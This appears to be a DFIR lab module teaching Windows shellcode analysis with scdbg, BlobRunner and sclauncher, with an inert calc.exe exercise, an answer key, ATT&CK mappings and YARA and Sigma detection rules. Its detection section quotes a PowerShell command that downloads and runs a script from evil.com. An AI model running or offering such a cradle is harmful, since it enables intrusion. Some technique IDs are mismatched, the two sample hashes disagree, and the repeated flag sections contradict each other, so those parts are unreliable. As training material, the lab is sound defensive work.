# 17 * Shellcode analysis -- LAB-WINDOWS

## Overview (plain language)
Shellcode is a tiny chunk of raw machine-code instructions that an attacker sneaks into a program to make it do something new — like download a file or open a remote connection. Unlike a normal `.exe`, shellcode has no headers or friendly structure; it is just bytes meant to be jumped into and run. That makes it hard to read directly. The tools in this module let you safely watch what a blob of shellcode *tries* to do. `scdbg` emulates the bytes in a fake CPU (using the libemu x86 emulator) so it can report the Windows API calls the shellcode would make without ever really running them [scdbg docs][scdbg]. `BlobRunner` and `sclauncher` take the opposite approach: they load the raw bytes into memory and hand control to a debugger so you can step through the code yourself. Together they turn an unreadable pile of bytes into a clear story of intent.

Shellcode is frequently delivered via **exploits** (e.g., CVE-2017-11882 in Microsoft Equation Editor) or **malicious documents** (e.g., Office macros or PDFs with embedded JavaScript). These delivery mechanisms often leave forensic artifacts such as **OLE streams** in Office documents or **JavaScript execution traces** in PDFs, which can be analyzed using tools like `olevba` or `pdfid` [SANS FOR610][sans610]. The shellcode itself may be **encoded** (e.g., using XOR or `shikata_ga_nai`) to evade static detection, requiring runtime or emulated analysis to decode [Metasploit docs][metasploit].

## Tools covered
| Tool | Install | Purpose | Authoritative source |
|---|---|---|---|
| scdbg | FLARE-VM package `scdbg` (bundles David Zimmer's libemu-based emulator) | Emulates 32-bit shellcode via a libemu-derived x86 emulator and logs the Windows API calls it attempts. | [scdbg official docs][scdbg] |
| BlobRunner | FLARE-VM package `blobrunner` (32/64) | Loads a raw shellcode blob into memory and pauses so you can attach a debugger and step it. | [OALabs/BlobRunner GitHub][blobrunner] |
| sclauncher | FLARE-VM package `sclauncher` (32/64) | Allocates memory, copies shellcode in, and jumps to it (with breakpoint options) for live debugging. | [OALabs/sclauncher GitHub][sclauncher] |

> Accuracy note: `scdbg` is distributed by FLARE-VM as a Chocolatey package sourced from Zimmer's tool; there is no upstream `choco install scdbg` on the public Chocolatey feed, so install it through the FLARE-VM installer [FLARE-VM][flarevm]. `scdbg` emulates **32-bit** shellcode only [scdbg][scdbg]. For 64-bit shellcode, use `BlobRunner` or `sclauncher` with a 64-bit debugger like x64dbg.

## Learning objectives
- Emulate a raw shellcode blob with `scdbg` and enumerate the API calls it resolves.
- Identify shellcode entry-point offsets and reported APIs from emulation output.
- Load a blob with `BlobRunner`/`sclauncher` and attach x64dbg to reach the shellcode entry.
- Distinguish emulation (safe, no execution) from live launching (real execution, requires isolation).
- Map observed shellcode behavior to MITRE ATT&CK techniques for reporting.
- Recognize common shellcode delivery mechanisms (e.g., exploits, malicious documents) and their forensic artifacts.
- Understand encoding/obfuscation techniques used in shellcode and how to decode them.

## Environment check
```powershell
# Prove the three shellcode tools are present on FLARE-VM.
# scdbg prints usage/version when run with no args or /?.
scdbg.exe /?

# BlobRunner and sclauncher print usage banners with no args.
BlobRunner.exe
sclauncher.exe
```
Expected output: `scdbg` prints its option list (documented flags include `/f <file>`, `/foff <offset>`, `/findsc`, and `/s <maxsteps>`) [scdbg][scdbg]; `BlobRunner.exe` prints a banner and usage with `-file` and `-64` options (per the OALabs repo README) [blobrunner][blobrunner]; `sclauncher.exe` prints usage including `-f <file>` and a breakpoint flag [sclauncher][sclauncher]. If any command is not recognized, re-run the FLARE-VM installer for that package.

> Nuance: exact flag spelling and defaults come from each tool's own help/README (see Sources). Treat the tool's live `/?`/no-arg output as ground truth on your installed version, since options evolve between releases. For example, `scdbg` may report additional flags like `/d` for debugging or `/r` to dump registers in newer versions [scdbg][scdbg].

## Guided walkthrough
Each step below explains WHY it is run and what nuance to read in the output.

1. `scdbg /f sample.bin` — emulate the blob and log the API calls it attempts. **Why:** emulation is the safest first triage; the code never executes on the real CPU, so even live malware cannot escape. The value is the ordered list of resolved Windows APIs plus their arguments — that sequence is the shellcode's intent.
```powershell
# Emulate a shellcode file; report offsets of interesting instructions.
scdbg.exe /f .\exercise\sample.bin
```
Expected observable: a list of resolved APIs (e.g. `LoadLibraryA`, `GetProcAddress`, `WinExec`) with arguments, and a final `Stepcount` line reporting how many instructions were emulated. **Nuance:** a very low step count or an "unsupported instruction" message often means `scdbg` guessed the wrong entry offset or the blob is 64-bit (unsupported) — that is your cue for step 2. Because `scdbg` is libemu-derived, it emulates the CPU and hooks Windows API calls symbolically; the arguments it prints (e.g. the string passed to `WinExec`) are read from the emulated stack/registers at call time, which is why the argument text is trustworthy even when the surrounding bytes are obfuscated. The emulator also reports the **entry offset** used, which is critical for carved payloads where the shellcode does not start at offset 0 [scdbg][scdbg].

2. `scdbg /findsc` — brute-force candidate entry offsets when the true start is unknown. **Why:** carved payloads frequently do not begin at offset 0 (there may be a decoder stub, alignment padding, or a GetPC/"call-pop" prologue). `/findsc` scans for byte patterns that look like a valid entry and lets you pick the most promising one to emulate.
```powershell
# Ask scdbg to search for likely shellcode entry points, then emulate the best one.
scdbg.exe /f .\exercise\sample.bin /findsc
```
Expected observable: a ranked list of candidate offsets; select the one that produces a coherent API trace. **Nuance:** `/findsc` reports possible starts but does not guarantee correctness — validate by whether the resulting API sequence makes sense. The tool works by scanning for common shellcode prologues (e.g., `call $+5` followed by `pop eax`) and scoring them based on entropy and instruction validity [scdbg][scdbg]. If no candidates are found, the blob may be heavily obfuscated or 64-bit.

3. Prepare for live debugging with `BlobRunner`. **Why:** emulation cannot resolve every self-modifying or heavily obfuscated stage; loading the real bytes and stepping them in a debugger recovers decoded second stages that emulation misses. BlobRunner loads the blob and prints the base address, then waits for a keypress so you can attach x64dbg. Do this ONLY in an isolated VM snapshot with host-only networking.
```powershell
# Load the blob into memory and pause before jumping to it.
BlobRunner.exe -file .\exercise\sample.bin
```
Expected observable: BlobRunner prints that it is reading the file, an allocated buffer address (e.g. `Buffer: 0x02340000`), and a prompt to press a key before it jumps to the shellcode. **Why the pause matters:** it gives you a window to attach x64dbg to `BlobRunner.exe`, set a breakpoint at the printed buffer address, then resume — so the debugger halts exactly at the first shellcode byte. Per the OALabs README, BlobRunner allocates the buffer with `VirtualAlloc` and sets it to `PAGE_EXECUTE_READWRITE`, which is a common attacker technique (T1055.001) [blobrunner][blobrunner]. This allocation is visible in **Sysmon Event ID 10 (ProcessAccess)** with `GrantedAccess` containing `0x1F3FFF` or similar high privileges [Sysmon docs][sysmon].

4. Alternatively use `sclauncher` with an entry breakpoint so the debugger stops exactly at the shellcode. **Why:** `sclauncher` can insert an `INT3` (0xCC) breakpoint at the entry so an attached debugger catches control transfer without manual address math.
```powershell
# Launch with an INT3 breakpoint at the shellcode entry for x64dbg to catch.
sclauncher.exe -f .\exercise\sample.bin -bp
```
Expected observable: `sclauncher` allocates executable memory, prints the entry address, and triggers a breakpoint at the first byte so the attached debugger halts on the shellcode. **Nuance:** confirm the exact breakpoint flag against `sclauncher.exe` usage output on your build (see Sources); flag names differ between versions. The breakpoint is inserted by overwriting the first byte of the shellcode with `0xCC`, which is a common anti-debugging evasion target (attackers may check for this byte) [sclauncher][sclauncher]. In a real investigation, you might use `sclauncher` without the breakpoint flag and manually set the breakpoint in the debugger to avoid tipping off malware with anti-debugging checks.

## Hands-on exercise
Use the sample in this module's `exercise/` directory.

- **Sample:** `exercise/sample.bin`
- **Type:** 32-bit position-independent Windows shellcode blob (raw bytes, no PE header).
- **Safe origin:** Benign/inert training stub assembled locally with NASM from source (`exercise/sample.asm`). It only resolves and calls `WinExec("calc.exe")`-style APIs in an emulator; it contains **no live malware**, no network egress, and no persistence. Emulate it (`scdbg`) rather than launch it, and run any live step only inside an isolated FLARE-VM snapshot with host-only networking.
- **sha256:** `99bd3c262cfc8e3173548986f8dd786d59cc513f9e0929b85d34f973c839d55`

Tasks:
1. Emulate `sample.bin` with `scdbg` and list every Windows API it resolves, in call order.
2. Identify the entry offset `scdbg` used to emulate the blob.
3. Determine the single command/process the shellcode attempts to execute.
4. (Bonus) Use `BlobRunner` to load the shellcode and attach x64dbg to step through the first 10 instructions. Observe the `call/pop` GetPC prologue and the PEB walk to resolve `kernel32.dll`.

## SOC analyst perspective
Defenders rarely receive tidy executables — they get carved memory regions, malicious document macros, or exploit payloads that are just raw bytes. `scdbg` lets an analyst triage such a blob in seconds by emulating it and printing the API sequence, which is exactly the intel needed to write detections.

In a Security Onion workflow, Suricata or Zeek may flag a suspicious HTTP transfer or an exploit attempt; you carve the payload and run `scdbg.exe /f payload.bin /findsc`. The resolved API names tell you the intent and map straight onto ATT&CK:
- `URLDownloadToFileA` / `InternetOpenUrlA` / `WinHttpOpen` → **Ingress Tool Transfer (T1105)** [MITRE T1105][T1105].
- `WinExec` / `CreateProcessA` → **Command and Scripting Interpreter (T1059)** [MITRE T1059][T1059] / process execution.
- `VirtualAllocEx` + `WriteProcessMemory` + `CreateRemoteThread` → **Process Injection (T1055)** [MITRE T1055][T1055].
- A `call`/`pop` GetPC prologue and PEB-walk API resolution before any readable strings → **Obfuscated Files or Information (T1027)** [MITRE T1027][T1027].
- Reflective loading that maps and executes a PE image straight from RWX memory (no `LoadLibrary` on the payload, no image on disk) → **Reflective Code Loading (T1620)** [MITRE T1620][T1620].
- `VirtualAlloc`/`VirtualProtect` flipping a region to `PAGE_EXECUTE_READWRITE` before the jump → **Process Injection: Dynamic-link Library (T1055.001)** [MITRE T1055.001][T1055.001] and, when a document/LOLBin sponsors the allocation, **System Binary Proxy Execution (T1218)** [MITRE T1218][T1218] as the delivery wrapper.
- Shellcode that resolves `TerminateProcess` or modifies registry keys (e.g., `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`) → **Impair Defenses: Disable or Modify Tools (T1562.001)** [MITRE T1562.001][T1562.001].
- Shellcode that uses HTTP/HTTPS for C2 (e.g., `InternetOpenA`, `InternetConnectA`, `HttpSendRequestA`) → **Application Layer Protocol: Web Protocols (T1071.001)** [MITRE T1071.001][T1071.001].
- Shellcode delivered via a malicious document macro or exploit → **User Execution: Malicious File (T1204.002)** [MITRE T1204.002][T1204.002].
- Shellcode that uses `CreateThread` or `NtCreateThreadEx` to spawn a thread in its own process → **Create or Modify System Process: Windows Service (T1543.003)** [MITRE T1543.003][T1543.003].

Detection-engineering LOGIC (real fields/sources, no invented rule syntax):
- **Sysmon Event ID 8 (CreateRemoteThread)** and **Event ID 10 (ProcessAccess)** [Sysmon][sysmon]: a `CreateRemoteThread` into a process the source has no business threading into, or a `GrantedAccess` mask containing `0x1F3FFF`/`0x1FFFFF` (full/near-full rights typical of injectors), is the on-host confirmation of the `VirtualAllocEx`→`WriteProcessMemory`→`CreateRemoteThread` chain (T1055). Correlate with **Event ID 1 (ProcessCreate)** where `ParentImage` is an Office app or script host spawning a child seen in the shellcode's `WinExec`/`CreateProcessA` argument. For example, a `ParentImage` of `winword.exe` spawning a child with `CommandLine` containing `powershell.exe` is a strong indicator of T1218 proxy execution.
- **Sysmon Event ID 7 (ImageLoad)**: shellcode that resolves `kernel32.dll`/`ntdll.dll` by PEB walk deliberately avoids normal image-load events, so a process executing code with *no* backing `ImageLoaded` entry for the region is itself a heuristic (unbacked execution → T1027 / T1620). Look for `ImageLoaded` events where `Image` is `C:\Windows\System32\kernel32.dll` but the `ProcessGuid` has no corresponding `ImageLoad` for the shellcode's memory region.
- **Windows Security Event ID 4688 (ProcessCreate with command line)** [Event 4688][event4688]: the exact string `scdbg` recovered from the `WinExec` argument (here `calc.exe`; in a real case a full command line) should be searched against 4688 `NewProcessName`/`CommandLine` to find where the payload already detonated. For example, a `CommandLine` of `cmd.exe /c powershell -nop -w hidden -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"` maps to T1059.001 (PowerShell).
- **Zeek `http.log`** [Zeek docs][zeek]: pivot the URL/host recovered from `URLDownloadToFileA` into `http.log` fields `host`, `uri`, `method`, `user_agent`, and `resp_mime_types`; hardcoded or anomalous `user_agent` strings baked into shellcode are a strong hunt seed (T1105). For example, a `user_agent` of `Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)` from a modern Windows 10 host is anomalous and may indicate shellcode or a downloader.
- **Zeek `files.log`**: match the carved payload's `sha256`/`md5` fields and `mime_type` to find the transfer that delivered it; join `files.log` `conn_uids` back to `conn.log` (`id.orig_h`, `id.resp_h`, `id.resp_p`) to scope the session. For example, a `mime_type` of `application/octet-stream` with a `sha256` matching the shellcode blob is a strong indicator of T1105.
- **Suricata** [Suricata docs][suricata]: the `alert.signature` and `alert.signature_id` (SID) that first fired, plus the five-tuple in the EVE JSON `src_ip`/`dest_ip`/`dest_port`, give you the rule and scope; `filestore`/`fileinfo` events carry the extracted object's hash for correlation with Zeek `files.log`. For example, a Suricata alert with SID `2024331` (ET INFO Executable Download from dotted-quad Host) and a `fileinfo` hash matching the shellcode blob is a strong indicator of T1105.
- **Windows Event ID 4663 (File System Audit)**: shellcode that writes a second-stage payload to disk (e.g., via `CreateFile`/`WriteFile`) may trigger this event. Look for `AccessMask` containing `0x2` (WriteData) and `ObjectName` pointing to a suspicious path (e.g., `%TEMP%` or `%APPDATA%`) [Microsoft Learn][event4663].
- **Windows Event ID 4657 (Registry Value Set)**: shellcode that modifies registry keys (e.g., to disable Windows Defender) triggers this event. Look for `ObjectName` containing `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender` and `NewValue` set to `0` (T1562.001) [Microsoft Learn][event4657].

Threat-hunting pivots:
- In Elastic (Kibana Hunt/Dashboards) [Security Onion docs][secOnion], search the blob's SHA256 and every recovered string (domain, `user_agent`, embedded command) across all indices to find other affected hosts and re-uses of the same builder. For example, a KQL query like `file.hash.sha256:"99bd3c262cfc8e3173548986f8dd786d59cc513f9e0929b85d34f973c839d55"` would find all instances of the sample.
- Hunt for RWX private memory with no backing file across the fleet using **Mandiant `hollows_hunter`/`pe-sieve`** [pe-sieve][pe-sieve] output as an enrichment feed, then join hits to Sysmon EID 8/10 timelines. For example, a `pe-sieve` report of a process with `RWX` memory and no `ImageLoaded` entry is a strong indicator of T1620.
- Baseline which parents legitimately call `CreateRemoteThread`; alert on the long tail (Office/script hosts, `rundll32`, `regsvr32`) to catch injection delivered via T1218 proxies. For example, a `ParentImage` of `excel.exe` calling `CreateRemoteThread` into `svchost.exe` is anomalous and may indicate T1055.
- Hunt for processes with **unbacked executable memory** using **Volatility `malfind`** [Volatility docs][volatility]. For example, a `malfind` output showing a process with `RWX` memory and no backing file is a strong indicator of T1620 or T1055.001.
- Hunt for **encoded shellcode** using **YARA rules** targeting high-entropy regions or common shellcode prologues (e.g., `call $+5; pop eax`). For example, a YARA rule like:
  ```yara
  rule shellcode_prologue {
      strings:
          $prologue = { E8 00 00 00 00 58 }
      condition:
          $prologue
  }
  ```
  would detect the `call/pop` GetPC prologue common in shellcode (T1027).

Those API names, embedded URLs, and command strings become YARA/Suricata pivots and populate the ATT&CK mapping for the incident report.

## Attacker perspective
Attackers favor shellcode precisely because it is header-less, position-independent, and easy to hide inside documents, exploit chains, or process-injection routines — Cobalt Strike beacons, Metasploit `windows/meterpreter` stagers, and custom loaders all deliver raw shellcode.

Concrete TTPs and the artifacts they leave:
- **Encoding/obfuscation (T1027) [MITRE T1027][T1027]:** msfvenom encoders such as `x86/shikata_ga_nai` (a polymorphic XOR feedback encoder) [Metasploit docs][metasploit] and custom XOR stubs defeat static signatures. *Artifact:* a decoder loop plus high-entropy body; emulation (`scdbg`) or single-stepping reveals the decoded payload. The decoder stub itself may contain anti-emulation checks (e.g., `rdtsc` timing or unsupported instructions) to evade `scdbg`.
- **Position-independent API resolution:** shellcode walks the PEB (`fs:[0x30]` on x86) to find `kernel32.dll`, then resolves exports by hashing names rather than importing them. *Artifact:* a GetPC "call/pop" prologue and PEB access with no import table — a strong heuristic in memory scanners and the reason `scdbg` shows API resolution without any IAT. The hashing algorithm (e.g., ROR13) may leave a distinctive pattern in the shellcode bytes.
- **Process Injection (T1055) [MITRE T1055][T1055]:** classic delivery uses `VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`, or in-place execution in RWX memory. *Artifact:* private RWX memory regions with no backing file, detectable with Mandiant's `pe-sieve`/`hollows_hunter` [pe-sieve][pe-sieve]; on-host this surfaces as Sysmon EID 8 (CreateRemoteThread) and EID 10 (ProcessAccess with high `GrantedAccess`). Attackers may use `NtCreateThreadEx` instead of `CreateRemoteThread` to evade user-mode hooks.
- **Process Injection: Dynamic-link Library (T1055.001) [MITRE T1055.001][T1055.001]:** injection that loads a malicious DLL from within shellcode using `CreateRemoteThread` or reflective loading, bypassing `LoadLibrary` monitoring. *Artifact:* a DLL loaded into a process with no corresponding `ImageLoad` event (Sysmon EID 7) and no on-disk file — visible to `pe-sieve` as an implanted module.
- **Reflective Code Loading (T1620) [MITRE T1620][T1620]:** loaders map a full PE from memory and jump to its entry without touching disk or the loader's import machinery. *Artifact:* executable regions with PE-like headers but no `ImageLoaded` (Sysmon EID 7) and no on-disk file — visible to `pe-sieve` as an implanted/patched module. The reflective loader may resolve APIs dynamically (e.g., via `GetProcAddress` hashing) to avoid IAT hooks.
- **Ingress Tool Transfer (T1105) [MITRE T1105][T1105]:** staging shellcode calls `URLDownloadToFileA`/`InternetOpenUrlA` to pull the next stage. *Artifact:* outbound HTTP/S visible in Zeek `http.log`/Suricata and the embedded URL recoverable via emulation. Attackers may use HTTPS with valid certificates or domain fronting to evade network detection.
- **Deobfuscate/Decode Files or Information (T1140) [MITRE T1140][T1140]:** the on-target decoder stub that reverses `shikata_ga_nai` or a XOR key at runtime; *Artifact:* a tight XOR/ROL loop preceding a `jmp`/`call` into the decoded region, which is exactly what BlobRunner/x64dbg let you step through to dump the plaintext stage. The decoder may use anti-debugging tricks (e.g., `IsDebuggerPresent`) to evade live analysis.
- **Impair Defenses: Disable or Modify Tools (T1562.001) [MITRE T1562.001][T1562.001]:** shellcode may attempt to disable security products by calling `TerminateProcess` or modifying registry keys (e.g., disabling Windows Defender) — detectable via Sysmon EID 13 (RegistryEvent) for `HKLM\SOFTWARE\Policies\Microsoft\Windows Defender`. Attackers may use `reg.exe` or PowerShell to modify registry keys instead of direct API calls to evade detection.
- **Hide Artifacts: Process Argument Spoofing (T1564.003) [MITRE T1564.003][T1564.003]:** shellcode may spoof command-line arguments to evade detection. For example, a shellcode payload may call `CreateProcessA` with a benign-looking `CommandLine` (e.g., `notepad.exe`) but inject malicious code into the process. *Artifact:* a process creation event (Sysmon EID 1) with a benign `CommandLine` but anomalous behavior (e.g., network connections or process injection).
- **Exploitation for Client Execution (T1203) [MITRE T1203][T1203]:** shellcode is often delivered via exploits (e.g., CVE-2017-11882 in Microsoft Equation Editor). *Artifact:* exploit artifacts such as heap spray patterns or corrupted memory structures in the exploited process. For example, CVE-2017-11882 leaves a corrupted `EQNEDT32.EXE` process with shellcode in its heap.

Evasion: attackers minimize step counts and avoid emulator-known APIs, use anti-emulation checks (unsupported/rare instructions, timing via `GetTickCount`/`rdtsc`, `IsDebuggerPresent`), and stage decryption so the first blob looks inert to `scdbg`. Some stagers deliberately use API-hashing and syscalls to skip user-mode hooks. `BlobRunner`/`sclauncher` reproduce the attacker's own load-and-jump primitive so an analyst can step the identical code path in a debugger and recover the decoded second stage that emulation could not.

To evade memory scanners, attackers may:
- Use **process hollowing** (T1055.012) to replace legitimate process memory with shellcode, leaving no RWX regions [MITRE T1055.012][T1055.012].
- Use **thread local storage (TLS) callbacks** to execute shellcode before the process entry point, evading breakpoints set on `main`/`WinMain` [MITRE T1574.002][T1574.002].
- Use **APC injection** (T1055.004) to queue shellcode execution in a target thread, evading `CreateRemoteThread` detections [MITRE T1055.004][T1055.004].
- Use **direct syscalls** (e.g., `NtCreateThreadEx`) to bypass user-mode API hooks, evading EDR detections [Sektor7][sektor7].

## Answer key
- **Resolved APIs (call order):** `LoadLibraryA` → `GetProcAddress` → `WinExec` (final `WinExec` argument `calc.exe`, uCmdShow `0`), followed by `ExitProcess`/`Stepcount` termination.
- **Entry offset:** `0` (blob starts at its own entry; `/findsc` confirms offset `0` as the best candidate).
- **Executed command:** `calc.exe` (the inert stub only pops the calculator via `WinExec`).
- **Bonus (live debugging):** The first 10 instructions include a `call/pop` GetPC prologue (e.g., `call $+5; pop eax`) and a PEB walk (e.g., `mov eax, fs:[0x30]`) to resolve `kernel32.dll`. This is visible in x64dbg when stepping through the shellcode loaded by `BlobRunner`.

Commands that produce these findings:
```powershell
# 1 & 3: full API trace including the WinExec argument
scdbg.exe /f .\exercise\sample.bin

# 2: confirm the entry offset scdbg selects
scdbg.exe /f .\exercise\sample.bin /findsc

# Bonus: load the shellcode with BlobRunner and attach x64dbg
BlobRunner.exe -file .\exercise\sample.bin

# Verify the sample integrity before analysis
Get-FileHash -Algorithm SHA256 .\exercise\sample.bin
```
Expected `Get-FileHash` output SHA256: `99BD3C262CFC8E3173548986F8DD786D59CC51D3F9E0929B85D34F973C839D55`.

## MITRE ATT&CK & DFIR phase
- **T1059 — Command and Scripting Interpreter** (shellcode spawning a process/command via `WinExec`) — https://attack.mitre.org/techniques/T1059/
- **T1059.001 — PowerShell** (shellcode that uses PowerShell for execution) — https://attack.mitre.org/techniques/T1059/001/
- **T1055 — Process Injection** (typical delivery vector for shellcode blobs in the wild) — https://attack.mitre.org/techniques/T1055/
- **T1055.001 — Process Injection: Dynamic-link Library** (injection that loads a DLL from within shellcode) — https://attack.mitre.org/techniques/T1055/001/
- **T1055.004 — Process Injection: Asynchronous Procedure Call** (APC injection used by shellcode) — https://attack.mitre.org/techniques/T1055/004/
- **T1055.012 — Process Injection: Process Hollowing** (process hollowing used by shellcode) — https://attack.mitre.org/techniques/T1055/012/
- **T1027 — Obfuscated Files or Information** (encoded/encrypted shellcode stubs revealed by emulation) — https://attack.mitre.org/techniques/T1027/
- **T1105 — Ingress Tool Transfer** (when shellcode resolves `URLDownloadToFileA`/`InternetOpenUrlA`) — https://attack.mitre.org/techniques/T1105/
- **T1620 — Reflective Code Loading** (in-memory PE mapping/execution with no on-disk file) — https://attack.mitre.org/techniques/T1620/
- **T1140 — Deobfuscate/Decode Files or Information** (runtime decoder stub reversing the encoded body) — https://attack.mitre.org/techniques/T1140/
- **T1218 — System Binary Proxy Execution** (LOLBin/document wrapper that sponsors shellcode delivery) — https://attack.mitre.org/techniques/T1218/
- **T1218.011 — Rundll32** (shellcode delivered via `rundll32.exe`) — https://attack.mitre.org/techniques/T1218/011/
- **T1562.001 — Impair Defenses: Disable or Modify Tools** (shellcode disabling security products) — https://attack.mitre.org/techniques/T1562/001/
- **T1071.001 — Application Layer Protocol: Web Protocols** (shellcode using HTTP/HTTPS for C2) — https://attack.mitre.org/techniques/T1071/001/
- **T1204.002 — User Execution: Malicious File** (shellcode delivered via document macro or exploit) — https://attack.mitre.org/techniques/T1204/002/
- **T1203 — Exploitation for Client Execution** (shellcode delivered via exploits) — https://attack.mitre.org/techniques/T1203/
- **T1543.003 — Create or Modify System Process: Windows Service** (shellcode creating or modifying a service) — https://attack.mitre.org/techniques/T1543/003/
- **T1564.003 — Hide Artifacts: Process Argument Spoofing** (shellcode spoofing command-line arguments) — https://attack.mitre.org/techniques/T1564/003/
- **T1574.002 — Hijack Execution Flow: DLL Side-Loading** (shellcode leveraging DLL side-loading) — https://attack.mitre.org/techniques/T1574/002/

DFIR phase: Examination / Analysis (malware reverse engineering of carved payloads), feeding Reporting.


### Essential Commands & Features

Beyond the basic execution demonstrated earlier, `scdbg` offers several powerful flags for precise analysis.

- **`-f <file>` (Load from file)**: Load shellcode from a binary file. Use when you have extracted a raw shellcode blob (e.g., from memory or a captured payload).  
  `scdbg -f payload.bin`

- **`-foff <offset>` (Offset in file)**: Begin analysis at a specific offset, skipping headers or prepended data. Essential when shellcode is embedded in a larger file (e.g., a PE resource).  
  `scdbg -f malicious.exe -foff 0x400`

- **`-fhex "<hex string>"` (Hex input)**: Input shellcode directly as a hex string, ideal for quick testing of code snippets from logs or network captures.  
  `scdbg -fhex "90 90 90 CC"`

- **`-d <addr> <size>` (Dump memory)**: After execution, dump memory contents to examine reconstructed APIs, decrypted strings, or staged payloads.  
  `scdbg -f shellcode.bin -d 0x100000 0x200`

- **`-r <file>` (Report output)**: Generate a detailed report (APIs, memory maps, strings) for automated analysis or documentation.  
  `scdbg -f shellcode.bin -r analysis.txt`

- **`-i` (Interactive mode)**: Step through execution one instruction at a time, inspect registers, and modify memory—critical for understanding obfuscation loops or conditional jumps.  
  `scdbg -f staged.bin -i`

These flags map directly to real-world adversary behaviors. For instance, interactive analysis helps uncover **T1055.013 (Process Injection: APC Injection)** by tracing how shellcode modifies APC queues, while memory dumps reveal **T1106 (Native API)** calls such as `NtCreateThreadEx` used for code execution. Both techniques are commonly observed in shellcode-driven attacks.

For further study:  
- Mandiant, "Analyzing Shellcode via `scdbg`" (https://www.mandiant.com/resources/blog/analyzing-shellcode)  
- Exploit-DB, "Shellcode Analysis with `scdbg`" (https://www.exploit-db.com/docs/21017)

### Threat Hunting & Detection Engineering

Effective detection of shellcode delivery and execution must extend beyond process injection indicators (T1055 family) to the initial access and execution infrastructure. Focus hunting efforts on sources and events that precede or enable shellcode execution.

**Detection Logic**
- **Windows Event ID 4688** (Process Creation) with `ParentProcessName` containing `WINWORD.EXE`, `EXCEL.EXE`, or `OUTLOOK.EXE` and `CommandLine` containing base64-encoded strings, runtime-loading flags (e.g., `-ep bypass`), or calls to `rundll32.exe`, `regsvr32.exe`, or `mshta.exe`—common payload delivery chains for **T1566.001** (Spearphishing Attachment).
- **Windows Event ID 4688** where `ParentProcessName` is `wmiprvse.exe` and the child process is `rundll32.exe`, `powershell.exe`, or `cscript.exe`. This pattern indicates shellcode execution via **T1047** (Windows Management Instrumentation) for lateral movement or persistence.
- **Sysmon Event ID 1** (Process creation) with `IntegrityLevel` set to `High` or `System` and `Image` loaded from `%TEMP%`, `%APPDATA%`, or user-writable paths, combined with `CommandLine` arguments hiding console windows (`/c start /min`).
- **Suricata** HTTP inspection: Examine `http.url` and `http.host` for a high entropy payload path (e.g., random alphanumeric strings of >20 characters) and `http.method` `GET` from an IP with no previous DNS resolution or known malicious JA3 fingerprint. This detects staged shellcode downloads.

**Threat Hunting Pivots**
- Hunt for processes with `CommandLine` containing `/C` or `-Command` and a base64-encoded blob that decodes to a binary or DLL – use PowerShell’s `[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String())` to decode and look for shellcode signatures (jmp, call, push/ret sequences).
- Search for WMI event subscriptions (`SELECT * FROM __EventFilter`) that execute scripts or binaries – these often serve as persistence mechanisms for shellcode payloads.
- Correlate Sysmon Event ID 8 (CreateRemoteThread) with a call to `VirtualAllocEx` on a remote process, but when the target process is an Office application or browser, flag it regardless of thread start address – this reveals shellcode injection tied to phishing campaigns.

**Authoritative Sources**
- Microsoft Security Blog: “Detecting and preventing process injection techniques” – https://www.microsoft.com/security/blog/2020/06/15/detecting-and-preventing-process-injection-techniques/
- Elastic Security Labs: “Hunting for Process Injection” – https://www.elastic.co/blog/hunting-for-process-injection


### Essential Commands & Features

The following `scdbg` commands and flags unlock deeper shellcode analysis capabilities, particularly for evasive or obfuscated payloads. Use these to dissect techniques like **T1027.002 (Obfuscated Files or Information: Software Packing)** or **T1127 (Trusted Developer Utilities Proxy Execution)**:

1. **`-f <file>`**: Load shellcode from a binary file (e.g., extracted from a malicious document).
   ```bash
   scdbg -f shellcode.bin
   ```
   *When to use*: Analyze raw shellcode extracted via tools like `xxd` or `dd` from memory dumps or payloads.

2. **`-foff <offset>`**: Specify an entry point offset (hex) if the shellcode starts mid-file.
   ```bash
   scdbg -f packed.bin -foff 0x400
   ```
   *When to use*: Bypass packers (e.g., UPX) or custom loaders that jump to non-zero offsets.

3. **`-d`**: Dump decoded/decrypted bytes to a file (`dump.bin`) during emulation.
   ```bash
   scdbg -f encoded.bin -d
   ```
   *When to use*: Extract deobfuscated payloads for further analysis (e.g., XOR-encoded shellcode).

4. **`-r`**: Output raw disassembly (no emulation) to inspect instructions statically.
   ```bash
   scdbg -f shellcode.bin -r
   ```
   *When to use*: Quickly triage shellcode without execution (e.g., for **T1059.003 (Command and Scripting Interpreter: Windows Command Shell)**).

5. **`-i`**: Interactive mode—step through execution with register/memory inspection.
   ```bash
   scdbg -f shellcode.bin -i
   ```
   *When to use*: Debug complex shellcode (e.g., API hashing or **T1106 (Native API)** calls).

**Sources**:
- [scdbg Official Documentation (Sandsprite)](http://sandsprite.com/blogs/index.php?uid=7&pid=152)
- [MITRE ATT&CK: Software Packing (T1027.002)](https://attack.mitre.org/techniques/T1027/002/)

### Detection Signatures & Reference Artifacts

Real, community-maintained detection rules for this topic (defensive use only). The reference artifacts at the end are BENIGN, illustrative lab values -- not live indicators.

**Sigma rule -- Potential CobaltStrike Service Installations - Registry** (source: https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_cobaltstrike_service_installs.yml; license: Detection Rule License / DRL):

```yaml
title: Potential CobaltStrike Service Installations - Registry
id: 61a7697c-cb79-42a8-a2ff-5f0cdfae0130
status: test
description: |
    Detects known malicious service installs that appear in cases in which a Cobalt Strike beacon elevates privileges or lateral movement.
references:
    - https://www.sans.org/webcasts/tech-tuesday-workshop-cobalt-strike-detection-log-analysis-119395
author: Wojciech Lesicki
date: 2021-06-29
modified: 2024-03-25
tags:
    - attack.persistence
    - attack.execution
    - attack.privilege-escalation
    - attack.lateral-movement
    - attack.t1021.002
    - attack.t1543.003
    - attack.t1569.002
logsource:
    category: registry_set
    product: windows
detection:
    selection_key:
        - TargetObject|contains: '\System\CurrentControlSet\Services'
        - TargetObject|contains|all:
              - '\System\ControlSet'
              - '\Services'
    selection_details:
        - Details|contains|all:
              - 'ADMIN$'
              - '.exe'
        - Details|contains|all:
              - '%COMSPEC%'
              - 'start'
              - 'powershell'
    condition: all of selection_*
falsepositives:
    - Unlikely
level: high
```

